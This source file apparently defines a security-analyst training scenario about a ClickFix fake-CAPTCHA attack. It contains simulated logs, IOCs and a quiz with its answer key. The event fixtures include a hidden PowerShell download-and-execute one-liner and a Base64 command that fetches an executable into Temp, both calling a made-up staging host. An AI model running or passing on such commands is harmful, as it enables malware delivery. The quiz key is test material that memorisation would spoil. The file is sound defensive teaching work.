/**
 * Scenario pack: "Verify You Are Human — ClickFix Paste-and-Run"
 *
 * BEGINNER tier. One user, one laptop, no lateral movement, no credential
 * theft across accounts. A fake "I'm not a robot" / human-verification
 * overlay instructs the user to press Win+R, paste, and press Enter. The
 * page has already copied a PowerShell one-liner to the clipboard — the
 * user never sees the command, never downloads a file, and never clicks
 * anything a browser or a proxy would flag as a download.
 *
 * This is "ClickFix" (also reported as "ClearFake"), a social-engineering
 * initial-access technique that became widespread from 2024 onward and is
 * still one of the most common commodity-malware delivery methods as of
 * 2026. It is deliberately not exploiting a browser bug — it is asking the
 * user to be the payload delivery mechanism, which is precisely why it
 * evades both web-download inspection and "don't run unknown files"
 * training.
 *
 * The teaching point is that the first PowerShell process in this chain has
 * no antecedent file-download event at all — it is fileless from the very
 * first instruction. An analyst trained to look for "what did they
 * download and run" will search the log for a file that was never written.
 *
 * Covers T1204.004 (User Execution: Malicious Copy and Paste),
 * T1059.001 (Command and Scripting Interpreter: PowerShell), and
 * T1105 (Ingress Tool Transfer).
 *
 * NOTE: `difficulty: "beginner"` is declared on the SCENARIOS registry entry
 * in scenarios.ts (ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildClickFixFakeCaptchaScenario(
  scenarioId = "clickfix-fake-captcha-2026",
): ScenarioBundle {
  const B = new Date("2026-07-21T14:10:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "WS-3387", ip: "10.14.19.56" };
  const victim = { email: "t.avraham@nexacorp.com", name: "Tomer Avraham", sam: "t.avraham" };
  const sensorId = "a92f5e17c084b3d1af06c2eaa3d5bb44";

  // Attacker-run lure page — built specifically to host the fake CAPTCHA,
  // not a hijacked trusted resource. A different teaching point from other
  // drive-by scenarios: nothing here relies on a well-known site being
  // compromised.
  const lurePage = "invoice-templates-pro.com";
  const widgetHost = "human-verify-check.net";
  const stagingHost = "pkg-delivery-cdn.net";
  const c2 = "sync-metrics-relay.com";

  // The first-stage script is never written to disk — it runs entirely in
  // memory via `iwr | iex`. There is deliberately no hash for it here; that
  // absence is itself the point of question 3 below.
  const stealerHash = makeSha256("commodity_infostealer_binary_paste_run_2026");
  const powershellHash = makeSha256("windows_powershell_v1_signed_microsoft");

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. The user lands on the lure page. Ordinary web browsing, allowed.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_01_lure_page",
      ts: T(0),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      user_title: "Sales Development Representative",
      src_ip: host.ip,
      severity: "low",
      description:
        "WS-3387 loaded a 'free invoice template' page on invoice-templates-pro.com at 14:10, allowed under the category computer-and-internet-info.",
      network: {
        url: `https://${lurePage}/templates/free-download`,
        domain: lurePage,
        method: "GET",
        status: 200,
        bytes_in: 61_204,
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "146.190.62.4",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "computer-and-internet-info",
        "pan.url": `${lurePage}/templates/free-download`,
        "pan.http_method": "GET",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "702214",
        "source.ip": host.ip,
        "url.domain": lurePage,
        "http.response.status_code": "200",
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 2. The fake CAPTCHA widget loads. This is what copies the command to
    //    the clipboard client-side — nothing here is a file, so nothing here
    //    is scanned as one.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_02_widget_fetch",
      ts: T(45_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "low",
      description:
        "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
      network: {
        url: `https://${widgetHost}/widget/captcha.js`,
        domain: widgetHost,
        method: "GET",
        status: 200,
        bytes_in: 9_872,
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "185.207.14.92",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "computer-and-internet-info",
        "pan.url": `${widgetHost}/widget/captcha.js`,
        "pan.referer": `https://${lurePage}/templates/free-download`,
        "pan.http_method": "GET",
        "pan.from_zone": "TRUST",
        "pan.to_zone": "UNTRUST",
        "pan.session_id": "702239",
        "source.ip": host.ip,
        "url.domain": widgetHost,
        "http.response.status_code": "200",
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 3. THE EVENT THAT MATTERS. No file, no download — explorer.exe starts
    //    powershell.exe directly, consistent with the Run dialog receiving a
    //    pasted command rather than a double-clicked file.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_03_paste_run",
      ts: T(2 * MIN + 50_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1204.004",
      mitre_tactic: "Execution",
      description:
        "At 14:12:50 explorer.exe started powershell.exe with a hidden-window download-and-run command line. No file was downloaded or written beforehand — the process was launched directly, consistent with a pasted command run from the Windows Run dialog.",
      process: {
        name: "powershell.exe",
        pid: 8840,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "explorer.exe",
        parent_pid: 3912,
        cmdline:
          "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: powershellHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious Copy and Paste",
        "crowdstrike.detection.technique_id": "T1204.004",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "8840",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line":
          "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
        "process.hash.sha256": powershellHash,
        "process.signed": "true",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3912",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 4. The fileless stager pulls its content directly into memory.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_04_stager_fetch",
      ts: T(2 * MIN + 53_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      description:
        "Three seconds later the same host requested /v/init.ps1 from pkg-delivery-cdn.net, matching the URL in the PowerShell command line.",
      network: {
        url: `https://${stagingHost}/v/init.ps1`,
        domain: stagingHost,
        method: "GET",
        status: 200,
        bytes_in: 8_192,
      },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "alert",
        "pan.rule": "CORP-WEB-OUTBOUND",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "91.223.104.17",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "newly-registered-domain",
        "pan.url": `${stagingHost}/v/init.ps1`,
        "pan.session_id": "702318",
        "source.ip": host.ip,
        "url.domain": stagingHost,
        "action_result": "alert",
      },
    },

    // ---------------------------------------------------------------------
    // 5. The stager spawns a second PowerShell process with an encoded
    //    command, still nothing on disk.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_05_encoded_child",
      ts: T(2 * MIN + 58_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      description:
        "Five seconds later the same PowerShell process spawned a child PowerShell process with a Base64-encoded command line.",
      process: {
        name: "powershell.exe",
        pid: 8901,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "powershell.exe",
        parent_pid: 8840,
        cmdline:
          "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHAAawBnAC0AZABlAGwAaQB2AGUAcgB5AC0AYwBkAG4ALgBuAGUAdAAvAHYALwBzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAnACwAJwAlAFQARQBNAFAAJQBcAHMAeQBzAHUAcABkADMAMgAuAGUAeABlACcAKQA=",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: powershellHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "2048",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "8901",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line":
          "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHAAawBnAC0AZABlAGwAaQB2AGUAcgB5AC0AYwBkAG4ALgBuAGUAdAAvAHYALwBzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAnACwAJwAlAFQARQBNAFAAJQBcAHMAeQBzAHUAcABkADMAMgAuAGUAeABlACcAKQA=",
        "process.hash.sha256": powershellHash,
        "process.signed": "true",
        "process.parent.name": "powershell.exe",
        "process.parent.pid": "8840",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 6. The encoded command decodes to a download — this is where a file
    //    finally appears.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_06_stealer_written",
      ts: T(3 * MIN + 5_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      description:
        "The encoded command wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
      file: {
        name: "sysupd32.exe",
        path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
        extension: "exe",
        size: 891_648,
        sha256: stealerHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "crowdstrike.sensor.id": sensorId,
        "event.action": "file_created",
        "file.name": "sysupd32.exe",
        "file.path": "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
        "file.size": "891648",
        "file.hash.sha256": stealerHash,
        "file.code_signature.status": "unsigned",
        "process.name": "powershell.exe",
        "process.pid": "8901",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
      },
    },

    // ---------------------------------------------------------------------
    // 7. The dropped binary runs.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_07_stealer_execute",
      ts: T(3 * MIN + 9_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      description:
        "Four seconds later powershell.exe (PID 8901) launched sysupd32.exe from the Temp folder.",
      process: {
        name: "sysupd32.exe",
        pid: 9014,
        path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
        parent_name: "powershell.exe",
        parent_pid: 8901,
        cmdline: "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
        user: `NEXACORP\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: stealerHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.name": "sysupd32.exe",
        "process.pid": "9014",
        "process.executable": "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
        "process.command_line": "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
        "process.hash.sha256": stealerHash,
        "process.signed": "false",
        "process.code_signature.status": "unsigned",
        "process.parent.name": "powershell.exe",
        "process.parent.pid": "8901",
        "user.name": `NEXACORP\\${victim.sam}`,
        "host.name": host.hostname,
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 8. Its outbound call is refused at the perimeter.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_08_c2_blocked",
      ts: T(3 * MIN + 12_000),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_blocked",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1071.001",
      mitre_tactic: "Command and Control",
      description:
        "sysupd32.exe's outbound request to sync-metrics-relay.com was denied under the category newly-registered-domain.",
      network: { url: `https://${c2}/s/2`, domain: c2, method: "GET", status: 0 },
      raw: {
        "pan.type": "THREAT",
        "pan.subtype": "url",
        "pan.action": "block-url",
        "pan.rule": "BLOCK-NEWLY-REGISTERED",
        "pan.src": host.ip,
        "pan.srcuser": `nexacorp\\${victim.sam}`,
        "pan.dst": "185.212.171.30",
        "pan.dport": "443",
        "pan.app": "web-browsing",
        "pan.category": "newly-registered-domain",
        "pan.url": `${c2}/s/2`,
        "pan.session_id": "702381",
        "source.ip": host.ip,
        "url.domain": c2,
        "action_result": "block-url",
      },
    },

    // ---------------------------------------------------------------------
    // 9. The detection that opened the ticket.
    // ---------------------------------------------------------------------
    {
      id: "evt_cfc_09_edr_alert",
      ts: T(3 * MIN + 30_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      description:
        "Falcon raised a Critical detection on WS-3387 for a paste-and-run chain — explorer.exe directly spawning PowerShell, no antecedent download — and killed sysupd32.exe.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "ClickFixPasteAndRunChain",
        "crowdstrike.detection.description":
          "explorer.exe launched PowerShell with no preceding file download, matching the paste-and-run pattern associated with fake human-verification overlays. The chain fetched and executed an unsigned binary from a newly registered domain.",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.confidence": "88",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "User Execution: Malicious Copy and Paste",
        "crowdstrike.detection.technique_id": "T1204.004",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.detection.parent_process": "explorer.exe",
        "crowdstrike.detection.process_tree":
          "explorer.exe > powershell.exe > powershell.exe > sysupd32.exe",
        "crowdstrike.sensor.id": sensorId,
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.falcon_host_link": "https://falcon.crowdstrike.com/activity/detections/detail/a92f5e17",
        "event.action": "alert",
        "event.outcome": "blocked",
        "host.name": host.hostname,
        "host.ip": host.ip,
        "user.name": `NEXACORP\\${victim.sam}`,
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "domain",
      value: lurePage,
      first_seen: T(0),
      last_seen: T(45_000),
      reputation: "malicious",
      tags: ["clickfix-lure-page", "fake-download-site"],
    },
    {
      type: "domain",
      value: widgetHost,
      first_seen: T(45_000),
      last_seen: T(45_000),
      reputation: "malicious",
      tags: ["fake-captcha-widget", "clipboard-injection"],
    },
    {
      type: "domain",
      value: stagingHost,
      first_seen: T(2 * MIN + 53_000),
      last_seen: T(3 * MIN + 5_000),
      reputation: "malicious",
      tags: ["payload-staging", "newly-registered"],
    },
    {
      type: "domain",
      value: c2,
      first_seen: T(3 * MIN + 12_000),
      last_seen: T(3 * MIN + 12_000),
      reputation: "malicious",
      tags: ["c2", "newly-registered"],
    },
    {
      type: "sha256",
      value: stealerHash,
      first_seen: T(3 * MIN + 5_000),
      last_seen: T(3 * MIN + 30_000),
      reputation: "malicious",
      tags: ["infostealer", "unsigned", "temp-folder"],
    },
    {
      type: "host",
      value: host.hostname,
      first_seen: T(0),
      last_seen: T(3 * MIN + 30_000),
      reputation: "unknown",
      tags: ["user-endpoint", "affected"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "Which event is the moment the user actually executes the attacker's command, and what is unusual about it compared to a normal malicious download?",
      hint: "Look for a file_create event that comes before evt_cfc_03_paste_run. There isn't one.",
      kind: "single",
      options: [
        { value: "paste_run", label: "evt_cfc_03_paste_run — explorer.exe launches powershell.exe directly, with no file ever downloaded or written first" },
        { value: "widget", label: "evt_cfc_02_widget_fetch — loading the captcha.js widget is itself the execution" },
        { value: "stager_fetch", label: "evt_cfc_04_stager_fetch — the GET request for init.ps1 is the point of compromise" },
        { value: "stealer_written", label: "evt_cfc_06_stealer_written — nothing happened until a file actually appeared on disk" },
      ],
      answer: "paste_run",
      xp: 50,
      explanation:
        "evt_cfc_03 is a process_create with parent explorer.exe and no antecedent file_create anywhere in the log — that absence is the signature of a pasted command run through the Windows Run dialog, not a double-clicked download. evt_cfc_02 only fetches a script that runs inside the browser sandbox; it cannot start a Windows process on its own. evt_cfc_04 is the firewall's view of the second stage being fetched, three seconds after execution had already begun — by then the user has already acted. evt_cfc_06 is the first point a file appears, five minutes into the chain, which is far too late to be 'when it started.'",
    },
    {
      id: "q2",
      prompt:
        "The firewall allowed every request in this chain except the very last one. Why couldn't perimeter controls have stopped this earlier?",
      kind: "single",
      options: [
        { value: "no_download_object", label: "There was nothing to inspect — the command that mattered was typed by the user into a local dialog, not transmitted as a file the firewall could scan" },
        { value: "tls_blind", label: "TLS inspection was disabled, so the firewall could not see any of the URLs" },
        { value: "rule_misconfigured", label: "The CORP-WEB-OUTBOUND rule was misconfigured and should have blocked pkg-delivery-cdn.net" },
        { value: "wrong_category", label: "human-verify-check.net was miscategorised as a trusted domain" },
      ],
      answer: "no_download_object",
      xp: 60,
      explanation:
        "A firewall or proxy inspects things that cross the network as files or known-bad URLs. The clipboard write happens entirely inside the browser's JavaScript context — nothing is downloaded, so there is nothing for file inspection to scan, and the command the user pastes never touches the network at all. This is exactly why ClickFix is effective against organisations that are good at blocking malicious downloads. Option (b) is contradicted by the log — full URLs and filenames are visible throughout, meaning TLS inspection was active. Option (c) misreads the intent of pan.action 'alert': the rule logged every request as designed, and it did block the one request that matched an explicit newly-registered-domain rule. Option (d) is simply wrong — human-verify-check.net was correctly categorised as computer-and-internet-info, which is not a trust designation.",
    },
    {
      id: "q3",
      prompt:
        "There is no SHA256 hash anywhere in the log for init.ps1, the script that ran between evt_cfc_04 and evt_cfc_05. Why not, and what does that tell you?",
      kind: "single",
      options: [
        { value: "fileless", label: "It ran fileless — piped directly from Invoke-WebRequest into Invoke-Expression, so it never existed as a file the EDR could hash" },
        { value: "missed", label: "Falcon simply failed to capture it — a sensor gap that should be reported" },
        { value: "encrypted", label: "The script was downloaded encrypted and only decrypted in memory, which prevents hashing" },
        { value: "not_needed", label: "PowerShell scripts under 10 KB are not hashed by design" },
      ],
      answer: "fileless",
      xp: 60,
      explanation:
        "The command line in evt_cfc_03 is `iwr -useb ... | iex` — Invoke-WebRequest's output is piped straight into Invoke-Expression, which executes text in the current PowerShell session without ever writing it to disk. A file that never exists cannot be hashed; this is normal, expected behaviour for this exact command pattern, not a sensor failure. It is also a genuinely useful detection idea in the other direction: an analyst who expects every stage of an intrusion to leave a file behind will look for one that was never there and conclude, wrongly, that nothing happened at that step.",
    },
    {
      id: "q4",
      prompt:
        "Two PowerShell processes appear in this chain (PID 8840 and PID 8901) before any file exists. What is the relationship between them?",
      kind: "single",
      options: [
        { value: "parent_child_stage", label: "8840 is the process the user directly launched; it fetched and ran a second stage that spawned 8901 as its child, still without writing anything to disk" },
        { value: "unrelated", label: "They are unrelated — 8901 is a second, independent paste-and-run attempt by the same user" },
        { value: "reused_pid", label: "PID reuse — 8901 is the same process as 8840 restarted after a crash" },
        { value: "elevation", label: "8901 is 8840 elevated to SYSTEM via a UAC bypass" },
      ],
      answer: "parent_child_stage",
      xp: 50,
      explanation:
        "evt_cfc_05's raw fields show process.parent.name 'powershell.exe' and process.parent.pid '8840' — 8901 is a direct child of the first PowerShell process, launched with an EncodedCommand rather than typed input, and both are consistent with legitimate signed Microsoft binaries (process.signed 'true'). The staged design — a small first command that fetches a second, larger encoded command — is common because it lets the attacker change or update the payload after the user has already pasted the first, short command. Nothing in the evidence supports (c) or (d): integrity stays medium throughout, and PIDs are not reused while a process tree is active.",
    },
    {
      id: "q5",
      prompt:
        "You are closing the ticket. Which statement matches the evidence?",
      kind: "single",
      options: [
        { value: "ran_but_no_exfil", label: "The stealer executed on the host, but its outbound connection was blocked and Falcon killed the process — impact is limited to what it did locally before being stopped" },
        { value: "nothing_happened", label: "Nothing of consequence occurred, since the firewall blocked the final connection" },
        { value: "full_compromise", label: "The stealer successfully exfiltrated data before detection" },
        { value: "training_only", label: "This is a training/awareness issue for the user, not a security incident, since no malware was ever installed" },
      ],
      answer: "ran_but_no_exfil",
      xp: 60,
      explanation:
        "evt_cfc_06 and evt_cfc_07 are file_create and process_create events on WS-3387 for sysupd32.exe — the stealer did run. evt_cfc_08 shows pan.action 'block-url' on its only outbound attempt, and evt_cfc_09 records pattern_disposition_description 'Detection, Process Killed'. That combination means execution happened but the intended outcome — getting data out — did not, at least not over the connection that was observed. Option (b) understates it: a binary ran with user privileges before it was stopped, which still warrants a local review. Option (c) has no supporting evidence — every observed exfiltration attempt was blocked. Option (d) is the most costly mistake here: sysupd32.exe is a real, unsigned executable that ran on a corporate endpoint; user awareness is part of the remediation, not a substitute for treating this as an incident.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Verify You Are Human — ClickFix Paste-and-Run",
    threat_actor: "Commodity infostealer distributor (ClickFix paste-and-run)",
    attack_kind: "clickfix_paste_and_run",
    briefing:
      "CrowdStrike Falcon raised a Critical detection on WS-3387 at 14:13 for explorer.exe directly spawning PowerShell — no download preceded it. The user was browsing at the time. Work out what the user was told to do, and how far the resulting chain got.",
    narrative: `At 14:10 Tomer Avraham searched for a free invoice template and landed on invoice-templates-pro.com. The firewall allowed it under computer-and-internet-info, an unremarkable category for a page like this.

Forty-five seconds later the page loaded a script from human-verify-check.net — a fake "Verify you are human" overlay. Real CAPTCHAs ask you to click a checkbox; this one told him to press Windows+R, press Ctrl+V, and press Enter. What he never saw is that the page had already copied a command to his clipboard the moment the widget loaded.

At 14:12:50 explorer.exe launched powershell.exe with a hidden window and a one-line command: fetch https://pkg-delivery-cdn.net/v/init.ps1 and pipe it straight into Invoke-Expression. No file was downloaded first — the Run dialog executed exactly the text that had been placed on the clipboard. Three seconds later the firewall logged the GET request for init.ps1 itself, matching the URL in the command line.

Five seconds after that, the same PowerShell process spawned a second PowerShell process with a Base64-encoded command. That one finally wrote something to disk: five seconds later, sysupd32.exe appeared in C:\\Users\\t.avraham\\AppData\\Local\\Temp, unsigned, 871 KB. It ran four seconds after that.

Its first act was to call home. The connection to sync-metrics-relay.com was denied at the firewall under the newly-registered-domain category, and eighteen seconds later Falcon raised a Critical detection and killed the process.

Nothing in this chain involved a file the user downloaded and clicked. Every action up to the moment sysupd32.exe was written happened because a piece of text sat on his clipboard and he was told, by a fake CAPTCHA, exactly which three keys to press.`,
    learning_objectives: [
      "Recognise ClickFix / paste-and-run (T1204.004) from a process launched by explorer.exe with no antecedent file download",
      "Explain why perimeter file inspection cannot see a command that never crosses the network as a file",
      "Understand fileless execution via `iwr | iex` and why no hash exists for a script that never touched disk",
      "Trace a staged PowerShell parent/child relationship using process.parent.pid",
      "Separate 'the payload executed' from 'the payload succeeded' when the outbound connection was blocked",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(0), phase: "Initial Access", action: "User loads a lure page offering free invoice templates" },
      { ts: T(45_000), phase: "Initial Access", action: `Fake CAPTCHA widget loads from ${widgetHost} and copies a command to the clipboard` },
      { ts: T(2 * MIN + 50_000), phase: "Execution", action: "explorer.exe launches powershell.exe with no antecedent download (T1204.004)" },
      { ts: T(2 * MIN + 53_000), phase: "Command and Control", action: `Fileless stager fetched in-memory from ${stagingHost} (T1105)` },
      { ts: T(2 * MIN + 58_000), phase: "Execution", action: "Child PowerShell process spawned with an encoded command (T1059.001)" },
      { ts: T(3 * MIN + 5_000), phase: "Execution", action: "sysupd32.exe written to AppData\\Local\\Temp" },
      { ts: T(3 * MIN + 9_000), phase: "Execution", action: "sysupd32.exe executed" },
      { ts: T(3 * MIN + 12_000), phase: "Command and Control", action: `Outbound call to ${c2} blocked at the perimeter (T1071.001)` },
      { ts: T(3 * MIN + 30_000), phase: "Containment", action: "Falcon kills the process and raises a Critical detection" },
    ],
    questions,
  };
}
